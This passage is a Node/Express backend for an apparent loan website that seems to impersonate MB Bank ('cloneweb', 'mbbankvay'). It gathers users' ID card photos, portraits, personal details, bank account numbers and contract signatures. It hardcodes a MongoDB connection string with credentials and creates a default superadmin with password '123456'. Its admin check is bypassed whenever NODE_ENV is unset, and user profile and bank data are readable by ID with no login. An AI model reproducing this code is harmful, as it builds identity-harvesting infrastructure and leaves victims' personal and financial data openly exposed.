import { Buffer } from "buffer";
import cookieParser from "cookie-parser";
import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import session from "express-session";
import fs from "fs";
import https from "https";
import mongoose from "mongoose";
import multer from "multer";
import path from "path";
import process from "process";
import { fileURLToPath } from "url";

// Load environment variables
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Access environment variables safely
const PORT = process.env.PORT || 5000;
const SERVER_URL =
  process.env.SERVER_URL || "https://cloneweb-uhw9.onrender.com";
const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://khoa123:khoa123@cluster0.mviqmke.mongodb.net/LendingApp";

// Đặt NODE_ENV thành 'development' mặc định nếu không được đặt
const NODE_ENV = process.env.NODE_ENV || "development";
console.log(`Server running in ${NODE_ENV} mode`);

const app = express();

// Create upload directories if they don't exist
const uploadsDir = path.join(__dirname, "uploads");
const avatarsDir = path.join(uploadsDir, "avatars");
const documentsDir = path.join(uploadsDir, "documents");

if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir);
  fs.mkdirSync(avatarsDir);
  fs.mkdirSync(documentsDir);
}

// Configure multer for file storage
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    // Determine directory based on file type
    const uploadType = req.params.type || req.query.type;
    if (uploadType === "portrait" || uploadType === "avatar") {
      cb(null, avatarsDir);
    } else {
      cb(null, documentsDir);
    }
  },
  filename: function (req, file, cb) {
    // Generate unique filename with user ID and timestamp
    const userId = req.params.userId || req.query.userId || "user";
    const timestamp = Date.now();
    const fileExt = path.extname(file.originalname) || ".jpg";
    cb(
      null,
      `${userId}_${req.params.type || req.query.type}_${timestamp}${fileExt}`
    );
  },
});

const upload = multer({ storage });

// Middleware
app.use(
  cors({
    origin: [
      "http://localhost:5173",
      "http://localhost:3000",
      "https://mbbankvay.netlify.app",
      "https://mbbankvay.netlify.app/",
      "https://www.mbbankvay.netlify.app",
    ],
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    credentials: true,
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);
app.use(express.json({ limit: "50mb" })); // Increase limit for base64 images
app.use(express.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.static(path.join(__dirname, "dist")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));
app.use(cookieParser()); // For parsing cookies

// Session middleware
app.use(
  session({
    secret: "admin-secret-key",
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 86400000 }, // 24 hours
  })
);

// Connect to MongoDB
mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("Could not connect to MongoDB:", err));

// Anti-sleep mechanism for Render free tier
// Ping the server every 14 minutes to prevent it from sleeping
const pingInterval = 14 * 60 * 1000; // 14 minutes in milliseconds

function keepServerAwake() {
  setInterval(() => {
    https
      .get(SERVER_URL, (res) => {
        console.log(
          `[${new Date().toISOString()}] Ping sent to server, status: ${
            res.statusCode
          }`
        );
      })
      .on("error", (err) => {
        console.error(`[${new Date().toISOString()}] Ping error:`, err.message);
      });
  }, pingInterval);

  console.log(
    `Anti-sleep mechanism activated, pinging server every ${
      pingInterval / 60000
    } minutes`
  );
}

// User Schema
const userSchema = new mongoose.Schema({
  phone: {
    type: String,
    required: true,
    unique: true,
  },
  password: {
    type: String,
    required: true,
    minlength: 6,
  },
  avatarUrl: {
    type: String,
    default: null,
  },
  hasVerifiedDocuments: {
    type: Boolean,
    default: false,
  },
  fullName: {
    type: String,
    default: null,
  },
  personalInfo: {
    idNumber: String,
    gender: String,
    birthDate: String,
    occupation: String,
    income: String,
    loanPurpose: String,
    address: String,
    contactPerson: String,
    relationship: String,
    idCardFrontImage: String,
    idCardBackImage: String,
  },
  bankInfo: {
    accountNumber: String,
    accountName: String,
    bank: String,
    bankLogo: String,
    bankId: String,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

const User = mongoose.model("User", userSchema);

// Verification Document Schema
const documentSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "User",
    required: true,
  },
  documentType: {
    type: String,
    required: true,
    enum: ["frontId", "backId", "portrait"],
  },
  filePath: {
    type: String,
    required: true,
  },
  uploadedAt: {
    type: Date,
    default: Date.now,
  },
});

const Document = mongoose.model("Document", documentSchema);

// Contract Schema
const contractSchema = new mongoose.Schema({
  contractId: {
    type: String,
    required: true,
    unique: true,
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "User",
    required: true,
  },
  loanAmount: {
    type: String,
    required: true,
  },
  loanTerm: {
    type: String,
    required: true,
  },
  bankName: {
    type: String,
    default: "",
  },
  contractContent: {
    type: String,
    default: "",
  },
  signatureImage: {
    type: String,
    required: true,
  },
  status: {
    type: String,
    enum: ["pending", "approved", "rejected", "disbursed", "completed"],
    default: "pending",
  },
  statusHistory: [
    {
      status: String,
      changedBy: {
        type: mongoose.Schema.Types.ObjectId,
        ref: "Admin",
      },
      timestamp: {
        type: Date,
        default: Date.now,
      },
      notes: String,
    },
  ],
  createdAt: {
    type: Date,
    default: Date.now,
  },
  createdTime: {
    type: String,
    required: true,
  },
  createdDate: {
    type: String,
    required: true,
  },
});

const Contract = mongoose.model("Contract", contractSchema);

// Admin Schema
const adminSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    unique: true,
  },
  password: {
    type: String,
    required: true,
  },
  role: {
    type: String,
    enum: ["admin", "superadmin"],
    default: "admin",
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

const Admin = mongoose.model("Admin", adminSchema);

// Middleware đảm bảo user là admin
const isAdmin = async (req, res, next) => {
  try {
    // Sử dụng cookie có sẵn
    const adminCookie = req.cookies && req.cookies.adminToken;

    // Lấy bearer token từ header Authorization
    const authHeader = req.headers.authorization;
    let token = null;

    if (authHeader && authHeader.startsWith("Bearer ")) {
      token = authHeader.split(" ")[1];
    }

    // Kiểm tra session admin
    if (req.session && req.session.admin) {
      console.log("Admin authenticated via session");
      req.admin = req.session.admin;
      return next();
    }

    // Kiểm tra cookie
    if (adminCookie) {
      try {
        // Giả sử cookie chứa username
        const admin = await Admin.findOne({ username: adminCookie });
        if (admin) {
          console.log("Admin authenticated via cookie");
          req.admin = {
            id: admin._id,
            username: admin.username,
            role: admin.role,
          };
          return next();
        }
      } catch (cookieErr) {
        console.error("Cookie authentication error:", cookieErr);
      }
    }

    // Kiểm tra token từ username/password trong header
    if (token) {
      try {
        // Giải mã token base64 - Format: "username:password"
        const credentials = Buffer.from(token, "base64").toString();
        const [username, password] = credentials.split(":");

        console.log(`Attempting to authenticate with username: ${username}`);

        // Tìm admin theo username, KHÔNG phải theo token như ID
        const admin = await Admin.findOne({ username: username });

        if (admin && admin.password === password) {
          console.log("Admin authenticated via token");
          req.admin = {
            id: admin._id,
            username: admin.username,
            role: admin.role,
          };
          return next();
        } else {
          console.log("Admin authentication failed: invalid credentials");
        }
      } catch (tokenErr) {
        console.error("Token auth error:", tokenErr);
      }
    }

    // Nếu không có xác thực nào thành công, cho phép truy cập nếu là môi trường phát triển
    if (NODE_ENV === "development") {
      console.log("Development mode: bypassing admin authentication");
      req.admin = {
        id: "dev-admin",
        username: "dev-admin",
        role: "superadmin",
      };
      return next();
    }

    // Nếu tất cả các phương thức xác thực đều thất bại, trả về lỗi 401
    console.log("Admin authentication failed");
    return res.status(401).json({
      success: false,
      message: "Unauthorized - Authentication failed",
    });
  } catch (error) {
    console.error("Admin authentication error:", error);
    return res.status(500).json({
      success: false,
      message: "Server error during authentication",
    });
  }
};

// Notification Schema
const notificationSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "User",
    required: true,
  },
  title: {
    type: String,
    required: true,
  },
  message: {
    type: String,
    required: true,
  },
  type: {
    type: String,
    default: "general",
  },
  isRead: {
    type: Boolean,
    default: false,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

const Notification = mongoose.model("Notification", notificationSchema);

// Settings Schema
const settingsSchema = new mongoose.Schema({
  interestRate: {
    type: Number,
    default: 0.01, // 1% mặc định
  },
  maxLoanAmount: {
    type: Number,
    default: 500000000,
  },
  maxLoanTerm: {
    type: Number,
    default: 36,
  },
  updatedAt: {
    type: Date,
    default: Date.now,
  },
});

const Settings = mongoose.model("Settings", settingsSchema);

// Khởi tạo settings mặc định nếu chưa có
const initializeSettings = async () => {
  try {
    const settings = await Settings.findOne();
    if (!settings) {
      await Settings.create({
        interestRate: 0.01,
        maxLoanAmount: 500000000,
        maxLoanTerm: 36,
      });
      console.log("Default settings initialized");
    }
  } catch (error) {
    console.error("Error initializing settings:", error);
  }
};

initializeSettings();

// API lấy settings
app.get("/api/settings", async (req, res) => {
  try {
    let settings = await Settings.findOne();
    if (!settings) {
      settings = await Settings.create({
        interestRate: 0.01,
        maxLoanAmount: 500000000,
        maxLoanTerm: 36,
      });
    }

    return res.json({
      success: true,
      settings: {
        interestRate: settings.interestRate,
        maxLoanAmount: settings.maxLoanAmount,
        maxLoanTerm: settings.maxLoanTerm,
      },
    });
  } catch (error) {
    console.error("Error fetching settings:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi lấy cài đặt",
    });
  }
});

// API cập nhật settings (Admin only)
app.put("/api/admin/settings", isAdmin, async (req, res) => {
  try {
    const { interestRate, maxLoanAmount, maxLoanTerm } = req.body;

    let settings = await Settings.findOne();
    if (!settings) {
      settings = new Settings();
    }

    if (interestRate !== undefined) {
      settings.interestRate = parseFloat(interestRate);
    }
    if (maxLoanAmount !== undefined) {
      settings.maxLoanAmount = parseInt(maxLoanAmount);
    }
    if (maxLoanTerm !== undefined) {
      settings.maxLoanTerm = parseInt(maxLoanTerm);
    }

    settings.updatedAt = new Date();
    await settings.save();

    return res.json({
      success: true,
      message: "Cập nhật cài đặt thành công",
      settings,
    });
  } catch (error) {
    console.error("Error updating settings:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi khi cập nhật cài đặt",
    });
  }
});

// Create default admin on server start
const createDefaultAdmin = async () => {
  try {
    const adminExists = await Admin.findOne({ username: "admin" });
    if (!adminExists) {
      const admin = new Admin({
        username: "admin",
        password: "123456",
        role: "superadmin",
      });
      await admin.save();
      console.log("Default admin created successfully");
    }
  } catch (error) {
    console.error("Error creating default admin:", error);
  }
};

createDefaultAdmin();

// API Routes
// Sign Up
app.post("/api/auth/signup", async (req, res) => {
  try {
    const { phone, password } = req.body;

    // Check if user already exists
    const existingUser = await User.findOne({ phone });
    if (existingUser) {
      return res.status(400).json({ message: "Số điện thoại đã được đăng ký" });
    }

    // Create new user
    const user = new User({
      phone,
      password, // In a real app, you would hash this
    });

    await user.save();

    res
      .status(201)
      .json({ message: "Đăng ký thành công", user: { phone: user.phone } });
  } catch (error) {
    console.error("Sign up error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Login
app.post("/api/auth/login", async (req, res) => {
  try {
    const { phone, password } = req.body;

    // Find user
    const user = await User.findOne({ phone });

    // Check if user exists and password matches
    if (!user || user.password !== password) {
      return res
        .status(401)
        .json({ message: "Số điện thoại hoặc mật khẩu không đúng" });
    }

    res.status(200).json({
      message: "Đăng nhập thành công",
      user: {
        phone: user.phone,
        id: user._id,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        fullName: user.fullName,
        personalInfo: user.personalInfo,
      },
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Upload document API - accepts both form data and base64 encoded images
app.post(
  "/api/verification/upload/:type",
  upload.single("image"),
  async (req, res) => {
    try {
      const { userId } = req.body;
      const { type } = req.params;

      if (!userId) {
        return res.status(400).json({ message: "User ID is required" });
      }

      // Find user
      const user = await User.findById(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      let filePath;

      // Handle file upload or base64 image
      if (req.file) {
        // If uploaded via multer
        filePath = `/uploads/${req.file.destination.split("/").pop()}/${
          req.file.filename
        }`;
        console.log("File uploaded via multer:", filePath);
      } else if (req.body.imageData) {
        // If sent as base64
        const base64Data = req.body.imageData.replace(
          /^data:image\/\w+;base64,/,
          ""
        );
        const buffer = Buffer.from(base64Data, "base64");

        // Create filename
        const timestamp = Date.now();
        const fileExt = ".jpg";
        const filename = `${userId}_${type}_${timestamp}${fileExt}`;

        // Determine directory
        const directory =
          type === "portrait" || type === "avatar" ? avatarsDir : documentsDir;
        const fullFilePath = path.join(directory, filename);

        // Log the directory and file path for debugging
        console.log("Directory for saving:", directory);
        console.log("Full file path:", fullFilePath);

        // Save file
        fs.writeFileSync(fullFilePath, buffer);
        filePath = `/uploads/${
          type === "portrait" || type === "avatar" ? "avatars" : "documents"
        }/${filename}`;
        console.log("File saved from base64:", filePath);
      } else {
        return res.status(400).json({ message: "No image provided" });
      }

      // Check if a document of this type already exists
      const existingDoc = await Document.findOne({
        userId: user._id,
        documentType: type,
      });

      if (existingDoc) {
        // Update existing document
        existingDoc.filePath = filePath;
        existingDoc.uploadedAt = Date.now();
        await existingDoc.save();
        console.log("Updated existing document:", type, filePath);
      } else {
        // Create new document
        const document = new Document({
          userId: user._id,
          documentType: type,
          filePath: filePath,
        });
        await document.save();
        console.log("Created new document:", type, filePath);
      }

      // If portrait, update user's avatar
      if (type === "portrait" || type === "avatar") {
        user.avatarUrl = filePath;
        await user.save();
        console.log(`Updated user ${userId} avatarUrl to ${filePath}`);
      }

      // Check if user has all required documents
      const frontId = await Document.findOne({
        userId: user._id,
        documentType: "frontId",
      });
      const backId = await Document.findOne({
        userId: user._id,
        documentType: "backId",
      });
      const portrait = await Document.findOne({
        userId: user._id,
        documentType: "portrait",
      });

      if (frontId && backId && portrait) {
        user.hasVerifiedDocuments = true;
        await user.save();
        console.log(`User ${userId} is now verified`);
      }

      // Construct full URL for client use
      const fullUrl = `${SERVER_URL}${filePath}`;

      // Log URLs for debugging
      console.log("Server URL:", SERVER_URL);
      console.log("File path:", filePath);
      console.log("Full URL:", fullUrl);

      res.status(200).json({
        success: true,
        message: "File uploaded successfully",
        filePath,
        fileUrl: fullUrl,
        fullUrl: fullUrl,
        isVerified: user.hasVerifiedDocuments,
      });
    } catch (error) {
      console.error("Upload error:", error);
      res.status(500).json({ message: "Lỗi server", error: error.message });
    }
  }
);

// Get verification status
app.get("/api/verification/status/:userId", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const frontId = await Document.findOne({
      userId: user._id,
      documentType: "frontId",
    });
    const backId = await Document.findOne({
      userId: user._id,
      documentType: "backId",
    });
    const portrait = await Document.findOne({
      userId: user._id,
      documentType: "portrait",
    });

    // Add full URLs in the response alongside relative paths
    const documentsWithUrls = {};
    if (frontId) {
      documentsWithUrls.frontId = frontId.filePath;
      documentsWithUrls.frontIdUrl = `${SERVER_URL}${frontId.filePath}`;
    }
    if (backId) {
      documentsWithUrls.backId = backId.filePath;
      documentsWithUrls.backIdUrl = `${SERVER_URL}${backId.filePath}`;
    }
    if (portrait) {
      documentsWithUrls.portrait = portrait.filePath;
      documentsWithUrls.portraitUrl = `${SERVER_URL}${portrait.filePath}`;
    }

    res.status(200).json({
      isVerified: user.hasVerifiedDocuments,
      documents: documentsWithUrls,
      avatarUrl: user.avatarUrl,
      avatarFullUrl: user.avatarUrl ? `${SERVER_URL}${user.avatarUrl}` : null,
    });
  } catch (error) {
    console.error("Verification status error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Update user profile with personal information
app.post("/api/users/:userId/profile", async (req, res) => {
  try {
    const { userId } = req.params;
    const profileData = req.body;

    // Find the user
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Update user with personal information
    user.fullName = profileData.fullName;
    user.personalInfo = {
      idNumber: profileData.idNumber,
      gender: profileData.gender,
      birthDate: profileData.birthDate,
      occupation: profileData.occupation,
      income: profileData.income,
      loanPurpose: profileData.loanPurpose,
      address: profileData.address,
      contactPerson: profileData.contactPerson,
      relationship: profileData.relationship,
    };

    await user.save();

    res.status(200).json({
      success: true,
      message: "Profile updated successfully",
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        personalInfo: user.personalInfo,
      },
    });
  } catch (error) {
    console.error("Profile update error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Get user profile
app.get("/api/users/:userId/profile", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({
      success: true,
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        personalInfo: user.personalInfo,
      },
    });
  } catch (error) {
    console.error("Get profile error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Get user avatar
app.get("/api/users/:userId/avatar", async (req, res) => {
  try {
    const { userId } = req.params;
    console.log("Avatar request received for user ID:", userId);

    const user = await User.findById(userId);
    if (!user) {
      console.log("User not found for avatar request:", userId);
      return res.status(404).json({
        success: false,
        message: "User not found",
      });
    }

    if (!user.avatarUrl) {
      console.log("User has no avatar URL:", userId);

      // Look for portrait document as a fallback
      const portraitDoc = await Document.findOne({
        userId: user._id,
        documentType: "portrait",
      });

      if (portraitDoc && portraitDoc.filePath) {
        console.log("Found portrait document instead:", portraitDoc.filePath);

        // Update user with portrait URL and save
        user.avatarUrl = portraitDoc.filePath;
        await user.save();

        // Construct full URL for client use
        const fullUrl = `${SERVER_URL}${portraitDoc.filePath}`;
        console.log("Full portrait URL:", fullUrl);

        return res.status(200).json({
          success: true,
          avatarUrl: portraitDoc.filePath,
          fullAvatarUrl: fullUrl,
        });
      }

      return res.status(404).json({
        success: false,
        message: "User has no avatar",
      });
    }

    // Ensure we return the full URL
    const fullAvatarUrl = user.avatarUrl.startsWith("http")
      ? user.avatarUrl
      : `${SERVER_URL}${user.avatarUrl}`;

    console.log("Returning avatar URL:", fullAvatarUrl);

    res.status(200).json({
      success: true,
      avatarUrl: user.avatarUrl,
      fullAvatarUrl: fullAvatarUrl,
    });
  } catch (error) {
    console.error("Get avatar error:", error);
    res.status(500).json({
      success: false,
      message: "Lỗi server",
      error: error.message,
    });
  }
});

// Update user bank information
app.post("/api/users/:userId/bank-info", async (req, res) => {
  try {
    const { userId } = req.params;
    const bankData = req.body;

    // Find the user
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Update user with bank information
    user.bankInfo = {
      accountNumber: bankData.accountNumber,
      accountName: bankData.accountName,
      bank: bankData.bank,
      bankLogo: bankData.bankLogo,
      bankId: bankData.bankId,
    };

    await user.save();

    res.status(200).json({
      success: true,
      message: "Bank information updated successfully",
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
        hasVerifiedDocuments: user.hasVerifiedDocuments,
        avatarUrl: user.avatarUrl,
        personalInfo: user.personalInfo,
        bankInfo: user.bankInfo,
      },
    });
  } catch (error) {
    console.error("Bank information update error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Get user bank information
app.get("/api/users/:userId/bank-info", async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json({
      success: true,
      bankInfo: user.bankInfo || {
        accountNumber: "",
        accountName: "",
        bank: "",
      },
    });
  } catch (error) {
    console.error("Get bank information error:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Health check endpoint for ping
app.get("/health", (req, res) => {
  res.status(200).json({ status: "ok", timestamp: new Date().toISOString() });
});

// Get user contracts
app.get("/api/users/:userId/contracts", async (req, res) => {
  try {
    const { userId } = req.params;
    console.log("Đang lấy hợp đồng cho userId:", userId);

    // Thử với cả ObjectId và string ID
    let contracts = [];
    let _err1, _err2;

    try {
      // Debug logging
      console.log("Attempting to find contracts with userId (as is):", userId);

      // Với userId như đã cung cấp
      contracts = await Contract.find({ userId: userId }).sort({
        createdAt: -1,
      });

      console.log(`Found ${contracts.length} contracts with direct userId`);
    } catch (err1) {
      _err1 = err1;
      console.log("Error with direct userId:", err1.message);

      try {
        // Debug logging
        console.log("Attempting to find contracts with userId as ObjectId");

        // Thử với mongoose.Types.ObjectId
        if (mongoose.Types.ObjectId.isValid(userId)) {
          const objectId = new mongoose.Types.ObjectId(userId);
          contracts = await Contract.find({ userId: objectId }).sort({
            createdAt: -1,
          });
          console.log(`Found ${contracts.length} contracts with ObjectId`);
        } else {
          console.log("UserId is not a valid ObjectId:", userId);
        }
      } catch (err2) {
        _err2 = err2;
        console.log("Error with ObjectId:", err2.message);
      }
    }

    if (contracts.length === 0) {
      console.log(
        "No contracts found. Dumping contract collection structure for debug:"
      );
      // Lấy một mẫu hợp đồng để xem cấu trúc thực tế trong DB
      const sampleContract = await Contract.findOne({});
      if (sampleContract) {
        console.log(
          "Sample contract structure:",
          JSON.stringify(sampleContract)
        );
      } else {
        console.log("No contracts exist in the database");
      }
    }

    console.log(`Tìm thấy ${contracts.length} hợp đồng cho user ${userId}`);

    res.status(200).json({
      success: true,
      contracts: contracts.map((contract) => ({
        id: contract._id,
        contractId: contract.contractId,
        loanAmount: contract.loanAmount,
        loanTerm: contract.loanTerm,
        createdTime: contract.createdTime,
        createdDate: contract.createdDate,
        signatureUrl: contract.signatureImage,
        bankName: contract.bankName || "",
      })),
    });
  } catch (error) {
    console.error("Lỗi lấy danh sách hợp đồng:", error);
    res.status(500).json({
      success: false,
      message: "Lỗi server khi lấy danh sách hợp đồng",
      error: error.message,
    });
  }
});

// Create contract
app.post("/api/contracts", async (req, res) => {
  try {
    const {
      userId,
      contractId,
      loanAmount,
      loanTerm,
      bankName,
      contractContent,
      signatureImage,
    } = req.body;

    if (!userId || !contractId || !loanAmount || !loanTerm || !signatureImage) {
      return res.status(400).json({ message: "Thiếu thông tin hợp đồng" });
    }

    // Tạo ngày giờ hiện tại theo múi giờ Việt Nam (GMT+7)
    const now = new Date();
    // Lấy thời gian UTC
    const utcTime = now.getTime();
    // Chuyển sang múi giờ Việt Nam (UTC+7 = +7 giờ = +7*60*60*1000 mili giây)
    const vietnamTime = new Date(utcTime + 7 * 60 * 60 * 1000);

    // Định dạng giờ và ngày theo chuẩn Việt Nam
    const createdTime = `${String(vietnamTime.getUTCHours()).padStart(
      2,
      "0"
    )}:${String(vietnamTime.getUTCMinutes()).padStart(2, "0")}`;
    const createdDate = `${String(vietnamTime.getUTCDate()).padStart(
      2,
      "0"
    )}/${String(vietnamTime.getUTCMonth() + 1).padStart(
      2,
      "0"
    )}/${vietnamTime.getUTCFullYear()}`;

    // Lưu ảnh chữ ký
    const base64Data = signatureImage.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    // Tạo filename cho ảnh chữ ký
    const filename = `signature_${userId}_${contractId}_${Date.now()}.png`;
    const filePath = path.join(documentsDir, filename);

    // Lưu file
    fs.writeFileSync(filePath, buffer);
    const signatureUrl = `/uploads/documents/${filename}`;

    // Tạo hợp đồng mới với thông tin chi tiết
    const contract = new Contract({
      contractId,
      userId,
      loanAmount,
      loanTerm,
      bankName,
      contractContent,
      signatureImage: signatureUrl,
      createdTime,
      createdDate,
    });

    await contract.save();

    res.status(201).json({
      success: true,
      message: "Hợp đồng đã được lưu thành công",
      contract: {
        id: contract._id,
        contractId: contract.contractId,
        createdTime: contract.createdTime,
        createdDate: contract.createdDate,
        signatureUrl: contract.signatureImage,
      },
    });
  } catch (error) {
    console.error("Contract creation error:", error);
    res.status(500).json({ message: "Lỗi server khi lưu hợp đồng" });
  }
});

// Generate contract ID
app.get("/api/contracts/generate-id", async (req, res) => {
  try {
    // Hàm tạo mã hợp đồng ngẫu nhiên 8 chữ số
    const generateContractId = () => {
      return Math.floor(10000000 + Math.random() * 90000000).toString();
    };

    // Kiểm tra tính duy nhất của mã hợp đồng
    let contractId;
    let isUnique = false;

    while (!isUnique) {
      contractId = generateContractId();
      // Kiểm tra xem mã này đã tồn tại chưa
      const existingContract = await Contract.findOne({ contractId });
      if (!existingContract) {
        isUnique = true;
      }
    }

    res.status(200).json({
      success: true,
      contractId,
    });
  } catch (error) {
    console.error("Error generating contract ID:", error);
    res.status(500).json({ message: "Lỗi server" });
  }
});

// Admin Routes
// Login
app.post("/api/admin/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    // Kiểm tra thông tin đăng nhập
    const admin = await Admin.findOne({ username });

    if (!admin || admin.password !== password) {
      console.log("Admin login failed for username:", username);
      return res.status(401).json({
        success: false,
        message: "Tên đăng nhập hoặc mật khẩu không chính xác",
      });
    }

    // Lưu thông tin admin vào session
    req.session.admin = {
      id: admin._id,
      username: admin.username,
      role: admin.role,
    };

    // Tạo cookie với thông tin admin để dùng sau này
    res.cookie("adminToken", admin.username, {
      maxAge: 86400000, // 24 hours
      httpOnly: true,
      sameSite: "strict",
      path: "/",
    });

    console.log("Admin login successful for:", username);

    return res.json({
      success: true,
      message: "Đăng nhập thành công",
      admin: {
        id: admin._id,
        username: admin.username,
        role: admin.role,
      },
    });
  } catch (error) {
    console.error("Admin login error:", error);
    return res.status(500).json({
      success: false,
      message: "Lỗi server, vui lòng thử lại sau",
    });
  }
});

// Admin Dashboard API
app.get("/api/admin/dashboard", isAdmin, async (req, res) => {
  try {
    // Đếm tổng số người dùng
    const userCount = await User.countDocuments();

    // Đếm tổng số hợp đồng
    const loanCount = await Contract.countDocuments();

    // Đếm số hợp đồng theo trạng thái
    const pendingLoans = await Contract.countDocuments({ status: "pending" });
    const approvedLoans = await Contract.countDocuments({ status: "approved" });
    const rejectedLoans = await Contract.countDocuments({ status: "rejected" });
    const disbursedLoans = await Contract.countDocuments({
      status: "disbursed",
    });
    const completedLoans = await Contract.countDocuments({
      status: "completed",
    });

    // Tính tổng giá trị các hợp đồng
    const loans = await Contract.find({}, "loanAmount");
    let totalLoanAmount = 0;

    loans.forEach((loan) => {
      // Xử lý loanAmount có thể là chuỗi với định dạng như "500.000.000 đ"
      if (loan.loanAmount) {
        // Loại bỏ tất cả các ký tự không phải số
        const numericValue = loan.loanAmount.replace(/[^\d]/g, "");
        if (numericValue) {
          totalLoanAmount += parseInt(numericValue, 10);
        }
      }
    });

    // Lấy 5 người dùng mới nhất
    const recentUsers = await User.find()
      .select("phone fullName hasVerifiedDocuments createdAt")
      .sort({ createdAt: -1 })
      .limit(5);

    // Lấy 5 hợp đồng mới nhất
    const recentLoans = await Contract.find()
      .populate("userId", "phone fullName")
      .sort({ createdAt: -1 })
      .limit(5);

    // Lấy cài đặt lãi suất hiện tại
    const settings = await Settings.findOne();

    return res.json({
      success: true,
      stats: {
        userCount,
        loanCount,
        loanStats: {
          pending: pendingLoans,
          approved: approvedLoans,
          rejected: rejectedLoans,
          disbursed: disbursedLoans,
          completed: completedLoans,
        },
        totalLoanAmount,
        currentInterestRate: settings ? settings.interestRate : 0.12,
      },
      recentUsers,
      recentLoans,
    });
  } catch (error) {
    console.error("Dashboard data fetch error:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

// User Management
app.get("/api/admin/users", isAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 10, search = "" } = req.query;

    const queryOptions = {};
    if (search) {
      queryOptions.$or = [
        { phone: { $regex: search, $options: "i" } },
        { fullName: { $regex: search, $options: "i" } },
      ];
    }

    const users = await User.find(queryOptions)
      .select(
        "phone fullName hasVerifiedDocuments avatarUrl personalInfo createdAt"
      )
      .sort({ createdAt: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit));

    const totalUsers = await User.countDocuments(queryOptions);

    res.status(200).json({
      success: true,
      users,
      pagination: {
        total: totalUsers,
        page: Number(page),
        limit: Number(limit),
        pages: Math.ceil(totalUsers / limit),
      },
    });
  } catch (error) {
    console.error("Get users error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

app.get("/api/admin/users/:userId", isAdmin, async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId);
    if (!user) {
      return res
        .status(404)
        .json({ success: false, message: "User not found" });
    }

    res.status(200).json({
      success: true,
      user,
    });
  } catch (error) {
    console.error("Get user details error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

app.post("/api/admin/users", isAdmin, async (req, res) => {
  try {
    const { phone, password, fullName, personalInfo } = req.body;

    // Check if user exists
    const existingUser = await User.findOne({ phone });
    if (existingUser) {
      return res
        .status(400)
        .json({ success: false, message: "User already exists" });
    }

    // Create new user
    const user = new User({
      phone,
      password,
      fullName,
      personalInfo,
    });

    await user.save();

    res.status(201).json({
      success: true,
      message: "User created successfully",
      user: {
        id: user._id,
        phone: user.phone,
        fullName: user.fullName,
      },
    });
  } catch (error) {
    console.error("Create user error:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

app.put("/api/admin/users/:userId", isAdmin, async (req, res) => {
  try {
    const { userId } = req.params;
    const userData = req.body;

    const user = await User.findById(userId);
    if (!user) {
      return res
        .status(404)
        .json({ success: false, message: "User not found" });
    }

    // Cập nhật thông tin cơ bản
    if (userData.fullName) user.fullName = userData.fullName;
    if (userData.phone) user.phone = userData.phone;
    if (userData.email) user.email = userData.email;

    // Cập nhật thông tin cá nhân
    if (userData.personalInfo) {
      if (!user.personalInfo) user.personalInfo = {};

      if (userData.personalInfo.idNumber)
        user.personalInfo.idNumber = userData.personalInfo.idNumber;
      if (userData.personalInfo.dob)
        user.personalInfo.dob = userData.personalInfo.dob;
